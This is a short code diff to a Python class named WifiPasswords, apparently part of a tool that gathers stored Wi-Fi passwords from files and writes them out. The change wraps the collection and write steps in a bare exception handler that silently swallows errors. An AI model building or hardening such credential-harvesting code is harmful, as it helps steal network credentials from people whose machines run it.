@@ -47,8 +47,11 @@ class WifiPasswords:
                     pass
 
     def run(self):
-        self.get_files()
-        self.write()
+        try:
+            self.get_files()
+            self.write()
+        except:
+            pass
 
 
 #wifi = WifiPasswords()
